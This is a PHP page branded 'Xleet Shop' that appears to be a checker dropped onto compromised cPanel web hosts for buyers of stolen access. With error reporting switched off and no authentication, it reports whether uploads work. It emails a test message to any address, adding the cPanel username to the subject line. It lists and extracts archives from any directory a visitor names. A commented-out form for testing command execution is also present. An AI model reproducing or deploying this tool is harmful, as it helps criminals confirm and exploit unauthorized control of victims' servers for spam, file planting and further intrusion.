<?php
error_reporting(0);



function uploadOk ($dir){

        if(ini_get('file_uploads') == 1)
        {
          if (is_writable($dir)) {
                return true;
          }
        }
        return false;

}

function getCpUser (){
        preg_match("#\/home\/(.*)\/public_html#",__DIR__,$matc);
        return isset ($matc[1]) ? $matc[1] : get_current_user ();
}



function sendMail ($to, $subject, $message){

        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
         
        $from = $_SERVER['HTTP_HOST'] ? "sender@".$_SERVER['HTTP_HOST']: "sender@mydomain.com";
         
        // Create email headers
        $headers .= 'From: '.$from."\r\n".
                'Reply-To: '.$from;

        if(mail($to, $subject, $message)){
                return true;
        } else{
                return false;
        }
}



class Unzipper {
  public $localdir = "";
  public $zipfiles = array();
  public function __construct($dir) {
        $this->localdir = $dir;
    //read directory and pick .zip and .gz files
    if ($dh = opendir($this->localdir)) {
      while (($file = readdir($dh)) !== FALSE) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
          || pathinfo($file, PATHINFO_EXTENSION) === 'gz'
          || pathinfo($file, PATHINFO_EXTENSION) === 'rar'
        ) {
          $this->zipfiles[] = $this->localdir.$file;
        }
      }
      closedir($dh);
      if (!empty($this->zipfiles)) {
        $GLOBALS['zip_status'] = array('info' => '.zip or .gz or .rar files found, ready for extraction');
      }
      else {
        $GLOBALS['zip_status'] = array('info' => 'No .zip or .gz or rar files found. So only zipping functionality available.');
      }
    }
  }
  /**
   * Prepare and check zipfile for extraction.
   *
   * @param $archive
   * @param $destination
   */
  public function prepareExtraction($archive, $destination) {
    // Determine paths.
    if (empty($destination)) {
      $extpath = $this->localdir;
    }
    else {
      $extpath = $this->localdir . '/' . $destination;
      // todo move this to extraction function
      if (!is_dir($extpath)) {
        mkdir($extpath);
      }
    }

    //allow only local existing archives to extract
        $archive = $archive;

    if (in_array($archive, $this->zipfiles)) {
      self::extract($archive, $extpath);
    }

  }
  /**
   * Checks file extension and calls suitable extractor functions.
   *
   * @param $archive
   * @param $destination
   */
  public static function extract($archive, $destination) {
    $ext = pathinfo($archive, PATHINFO_EXTENSION);

    switch ($ext) {
      case 'zip':
        self::extractZipArchive($archive, $destination);
        break;
      case 'gz':
        self::extractGzipFile($archive, $destination);
        break;
      case 'rar':
        self::extractRarArchive($archive, $destination);
        break;
    }
  }
  /**
   * Decompress/extract a zip archive using ZipArchive.
   *
   * @param $archive
   * @param $destination
   */
  public static function extractZipArchive($archive, $destination) {
    // Check if webserver supports unzipping.
    if (!class_exists('ZipArchive')) {
      $GLOBALS['zip_status'] = array('error' => 'Error: Your PHP version does not support unzip functionality.');
      return;
    }
    $zip = new ZipArchive;
    // Check if archive is readable.



    if ($zip->open($archive) === TRUE) {
      // Check if destination is writable
      if (is_writeable($destination . '/')) {
        $zip->extractTo($destination);
        $zip->close();
        $GLOBALS['zip_status'] = array('success' => 'Files unzipped successfully');
      }
      else {
        $GLOBALS['zip_status'] = array('error' => 'Error: Directory not writeable by webserver.');
      }
    }
    else {
      $GLOBALS['zip_status'] = array('error' => 'Error: Cannot read .zip archive.');
    }
  }
  /**
   * Decompress a .gz File.
   *
   * @param $archive
   * @param $destination
   */
  public static function extractGzipFile($archive, $destination) {
    // Check if zlib is enabled
    if (!function_exists('gzopen')) {
      $GLOBALS['zip_status'] = array('error' => 'Error: Your PHP has no zlib support enabled.');
      return;
    }
    $filename = pathinfo($archive, PATHINFO_FILENAME);
    $gzipped = gzopen($archive, "rb");
    $file = fopen($filename, "w");
    while ($string = gzread($gzipped, 4096)) {
      fwrite($file, $string, strlen($string));
    }
    gzclose($gzipped);
    fclose($file);
    // Check if file was extracted.
    if (file_exists($destination . '/' . $filename)) {
      $GLOBALS['zip_status'] = array('success' => 'File unzipped successfully.');
    }
    else {
      $GLOBALS['zip_status'] = array('error' => 'Error unzipping file.');
    }
  }
  /**
   * Decompress/extract a Rar archive using RarArchive.
   *
   * @param $archive
   * @param $destination
   */
  public static function extractRarArchive($archive, $destination) {
    // Check if webserver supports unzipping.
    if (!class_exists('RarArchive')) {
      $GLOBALS['zip_status'] = array('error' => 'Error: Your PHP version does not support .rar archive functionality. <a class="info" href="http://php.net/manual/en/rar.installation.php" target="_blank">How to install RarArchive</a>');
      return;
    }
    // Check if archive is readable.
    if ($rar = RarArchive::open($archive)) {
      // Check if destination is writable
      if (is_writeable($destination . '/')) {
        $entries = $rar->getEntries();
        foreach ($entries as $entry) {
          $entry->extract($destination);
        }
        $rar->close();
        $GLOBALS['zip_status'] = array('success' => 'Files extracted successfully.');
      }
      else {
        $GLOBALS['zip_status'] = array('error' => 'Error: Directory not writeable by webserver.');
      }
    }
    else {
      $GLOBALS['zip_status'] = array('error' => 'Error: Cannot read .rar archive.');
    }
  }
}
/**
 * Class Zipper
 *
 * Copied and slightly modified from http://at2.php.net/manual/en/class.ziparchive.php#110719
 * @author umbalaconmeogia
 */
class Zipper {
  /**
   * Add files and sub-directories in a folder to zip file.
   *
   * @param string     $folder
   *   Path to folder that should be zipped.
   *
   * @param ZipArchive $zipFile
   *   Zipfile where files end up.
   *
   * @param int        $exclusiveLength
   *   Number of text to be exclusived from the file path.
   */
  private static function folderToZip($folder, &$zipFile, $exclusiveLength) {
    $handle = opendir($folder);
    while (FALSE !== $f = readdir($handle)) {
      // Check for local/parent path or zipping file itself and skip.
      if ($f != '.' && $f != '..' && $f != basename(__FILE__)) {
        $filePath = "$folder/$f";
        // Remove prefix from file path before add to zip.
        $localPath = substr($filePath, $exclusiveLength);
        if (is_file($filePath)) {
          $zipFile->addFile($filePath, $localPath);
        }
        elseif (is_dir($filePath)) {
          // Add sub-directory.
          $zipFile->addEmptyDir($localPath);
          self::folderToZip($filePath, $zipFile, $exclusiveLength);
        }
      }
    }
    closedir($handle);
  }
  /**
   * Zip a folder (including itself).
   * Usage:
   *   Zipper::zipDir('path/to/sourceDir', 'path/to/out.zip');
   *
   * @param string $sourcePath
   *   Relative path of directory to be zipped.
   *
   * @param string $outZipPath
   *   Relative path of the resulting output zip file.
   */
  public static function zipDir($sourcePath, $outZipPath) {
    $pathInfo = pathinfo($sourcePath);
    $parentPath = $pathInfo['dirname'];
    $dirName = $pathInfo['basename'];
    $z = new ZipArchive();
    $z->open($outZipPath, ZipArchive::CREATE);
    $z->addEmptyDir($dirName);
    if ($sourcePath == $dirName) {
      self::folderToZip($sourcePath, $z, 0);
    }
    else {
      self::folderToZip($sourcePath, $z, strlen("$parentPath/"));
    }
    $z->close();
    $GLOBALS['zip_status'] = array('success' => 'Successfully created archive ' . $outZipPath);
  }
}

$GLOBALS['zip_status'] = array();

$unzipper = new Unzipper(isset($_POST['pathunzip']) ? $_POST['pathunzip'] : __DIR__."/");


 
if (isset($_POST['dounzip'])) {

  $archive = isset($_POST['zipfile']) ? strip_tags($_POST['zipfile']) : '';
  $destination = isset($_POST['extpath']) ? strip_tags($_POST['extpath']) : '';
  $unzipper->prepareExtraction($archive, $destination);

}


if (isset($_POST['dounzipgetfiles'])) {
        $arrrx = array();
        $un = new Unzipper(rtrim($_POST['dounzipgetfiles'],'/')."/");
        foreach ($un->zipfiles as $uno) {
                $arrrx []= array('filepath'=>$uno,'name'=>basename($uno));
        }
        echo json_encode ($arrrx);
        die();

}

?><!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700" rel="stylesheet" />

<link rel="icon" href="favicon.png">
<link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
<link rel="apple-touch-icon" href="favicon.png">

  <title>Xleet Shop</title>
  <link rel="stylesheet" href="style.css" />
 <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" crossorigin="anonymous">

  <script src="jquery.min.js"></script>



  <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>
  <div class="container">
    <div class="row">
      <div class="col-lg-7 col-md-12 col-xs-12 col-centered mt-70">
        <div class="login-panel card card-primary page-container">
          <div class="card-heading text-center">
            <h4 class="card-title welcome-title">
              <i class="middle fab fa-2x fa-redhat red-color"></i> Xleet.to Shop 
            </h4>
            <p>We ‘re so excited to help you with the testing item !</p>
          </div>
          <div class="card-body">
            <form action="" method="post" role="form" class="">
              
                          <?php 
                          if (uploadOk (__DIR__))  {?>
                          <p
                style="background-color: #D4EDDA; border-radius: 5px; color: #3d6644; text-align: center; padding: 8px;">
                If you have seen this page, that's mean Uploading file is Work Well!</p>
                                <?php }?>

              <fieldset>
                  <hr />

                  <div class="card-heading text-center" style="margin-bottom: 25px;">
                      <h5 class="card-title welcome-title">
                        <i class="middle fab fa-2x fa-redhat red-color"></i> Test Send Result !
                      </h5>
                      <p style="margin-top: 5px; font-size: 15px;"> Use to testing send the result to email is working or not!
</p>
                    </div>


                                        <?php
                                        if (!empty($_POST['email'])){
                                                if (!empty($_POST['email'])){
                                                        $xx =$_POST['orderid'];
                                                }
                                                else{
                                                        $xx = rand();
                                                }
                                                $emailtestx = explode ("@",$_POST['email']);

                                                $emailtest =  str_repeat("*", strlen($emailtestx[0])).'@'.$emailtestx[1];
                                                $date_time = $_POST['date_time'];

                                                #$messages = "Send WORKING !\nDate Time:".$date_time;

                                                $subject = "#".rand()." Result reporting Success";

                                                $messages = "Send WORKING ! \nOrder Id: ".$xx;
                                                if ($user_cp = getCpUser ()) {
                                                        #$messages.= "\nCpUser: ".$user_cp;
                                                        $subject.= " - [".$user_cp."]";
                                                }
                                                $subject.= " - ".$xx;
                                        #       $messages.= "\nDomain:".$_SERVER['HTTP_HOST'];
                                                #$messages.= "\nHash:".md5(rand().$date_time .$_SERVER['HTTP_HOST']);
                                                @sendMail($_POST['email'],$subject,$messages);
                                                print "<p
                class='result-sucss'>send an report to [".$emailtest."] - Order : $xx</p>"; 
                                        }
                                        ?>


                <div class="form-group">
                  <label for="order-id">Report Order ID</label>
                  <div class="input-group">
                    <div class="input-group-prepend">
                      <span class="input-group-text" id=""><i class="fa fa-exclamation-triangle"></i></span>
                    </div>
                    <input min = "0" name = "orderid" class="form-control" placeholder="Order Report ID" name="" type="number" 
                      required value = "<?php if (isset($_POST['orderid'])){echo $_POST['orderid'];}?>"  />
                  </div>
                </div>
                <div class="form-group">
                  <label for="email">Email Test Result</label>
                  <div class="input-group">
                    <div class="input-group-prepend">
                      <span class="input-group-text" id=""><i class="fa fa-envelope"></i></span>
                    </div>
                    <input name = "email" value = "" class="form-control" placeholder="<?php if (isset($emailtest)){echo $emailtest;}else{echo "Email@domain.com";}?>" name="" type="email" 
                      required  />
                  </div>
                </div>
               
                <div class="form-group">

                                <input  name = "date_time" id="date_time"  name="" type="hidden" />
                                          
                                          <script>
                                var d = Date(Date.now()); 
                                a = d.toString();
                                $("#date_time").val(a);
                                </script>
                  <div id=""></div>
                </div>
                <div class="form-group">
                  <button type="submit" class="btn btn-block">
                    Send Test
                  </button>

                </div>
                <div class="form-group text-center"></div>

                <hr />


                        </form>
                                 
                        <form id = 'test_unzipper' action="" name = "" method="post" role="form" class="">

                <div class="card-heading text-center" style="margin-bottom: 25px;">
                    <h5 class="card-title welcome-title">
                      <i class="middle fa fa-2x fa-redhat red-color"></i> Test Unzipper !
                    </h5>
                    <p style="margin-top: 5px;">Use to testing the unzipper file is working or not!</p>
                  </div>

       

                <div class="form-group">

                                <?php 
                                        if ( isset($GLOBALS['zip_status'] ['success'])) {?>


                                          <p
                class="result-sucss">
                Files unzipped successfully!</p>

                                <?php
                                        }
                                        elseif  ( isset($GLOBALS['zip_status'] ['error'])) { ?>

                                                 <p
                    class="result-error">
                    <?php echo $GLOBALS['zip_status'] ['error'];?></p>

                                                <?php
                                        }
                                ?>
                   

                  
                    <?php 
                                        if ( isset($GLOBALS['zip_status'] ['info'])) {
                                                ?>
                    <div class="alert alert-info">


                                         
                    <?php 
                                                echo $GLOBALS['zip_status'] ['info'];
                                        ?>


                                        </div>


                                <?php   }
                                                ?>

                                <div class="form-group">
                  <label for="pathunzip">  </label>
                  <div class="input-group">
                    <div class="input-group-prepend">
                      <span class="input-group-text" id=""><i class="fa fa-folder"></i></span>
                    </div>
                    <input id = "pathunzip" name = "pathunzip" value = "<?php if (isset($_POST['pathunzip'])){echo$_POST['pathunzip'];}else{echo __DIR__.'/';}?>" class="form-control" placeholder="" name=""  />


                                         <button name = "dounzipgetfiles" id = "get_files" value = "true" type="submit" class="btn btn-">
                    Get Files
                  </button>
                                        <script>
                                        $("#get_files").click(function(e){


                                        $.ajax({
                                                  method: "POST",
                                                  url: "<?php echo $_SERVER['PHP_SELF'];?>",
                                                  dataType: "json",
                                                   beforeSend: function( xhr ) {
                                                        $("#dounzip").attr("disabled",'disabled');
                                                        },
                                                        complete: function( xhr ) {
                                                        $("#dounzip").removeAttr("disabled");
                                                        },
                                                        success: function( data ) {
                                                                $("#zippedfiles").html("");
                                                                $.each(data, function(i, value) {
                                                                        $("#zippedfiles").append("<option value = '"+value.filepath+"'>"+value.name+"</option>");

                                                                });

                                                        },

                                                  data:{dounzipgetfiles:$("#pathunzip").val()},
                                                });

                                                e.preventDefault();
                                        });

                                        </script>
                  </div>
                </div>

                    <div class="input-group">
                      <div class="input-group-prepend">
                        <span class="input-group-text" id=""><i class="fa fa-file-archive-o"></i></span>
                      </div>
                      <select class="form-control" id = "zippedfiles" name = "zipfile" required>
                      <?php 
                      if (count($unzipper->zipfiles) > 0) {
                      	foreach ($unzipper->zipfiles as $zip) {
                        	echo "<option value = '".$zip."'>".basename($zip)."</option>";
						}
                     }else {
                     	echo "<option value = ''>NoFiles</option>";
                     }?>
                                                          
                      </select>
  
  
                    </div>
                  </div>

                <div class="form-group">
                  <button id = "dounzip" name = "dounzip" value = "true" type="submit" class="btn btn-block">
                    Test Unzip File
                  </button>

                </div>


                                </form>
                                 <!--
                        <form action="" method="post" role="form" class="">
                <hr />

                <div class="card-heading text-center" style="margin-bottom: 25px;">
                    <h5 class="card-title welcome-title">
                      <i class="middle fab fa-2x fa-redhat red-color"></i> Test Executed Command !
                    </h5>
                    <p style="margin-top: 5px; font-size: 15px;"> Use to test executed command working or not!</p>
                  </div>

                <div class="form-group">
                    <p class="result-error">
                    Error: Unable to execute command.</p>

                    <p class="result-sucss">
                  Successfully Executed Command!</p>
                    
                    <label for="ques-valid">Executed Command</label>
                    <div class="input-group">
                      <div class="input-group-prepend">
                        <span class="input-group-text" id=""><i class="fa fa-terminal"></i></span>
                      </div>
                      <input class="form-control" placeholder="Write Command Line" name="" type="text" 
                      required autocomplete="off" />
  
  
                    </div>
                  </div>

                <div class="form-group">
                  <button type="submit" class="btn btn-block">
                    Test Executed Cmd
                  </button>

                </div>

              </fieldset>
            </form> -->
          </div>
          
        </div>
      </div>
    </div>
  </div>
  <br/> <br/><br/> 
</body>

<?php

if (isset($_POST['dounzip'])) {
  echo "<script>var elmnt = document.getElementById('test_unzipper');elmnt.scrollIntoView();</script>";
}

?>

</html>